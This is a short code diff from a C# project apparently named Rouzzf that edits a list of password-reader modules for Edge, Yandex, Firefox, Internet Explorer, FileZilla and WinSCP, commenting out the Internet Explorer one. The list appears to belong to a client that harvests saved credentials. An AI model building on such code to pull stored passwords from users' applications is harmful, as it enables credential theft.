@@ -39,7 +39,7 @@ namespace Rouzzf.Client.Messages
                 new EdgePassReader(),
                 new YandexPassReader(), 
                 new FirefoxPassReader(), 
-                new InternetExplorerPassReader(), 
+               // new InternetExplorerPassReader(), 
                 new FileZillaPassReader(), 
                 new WinScpPassReader()
             };
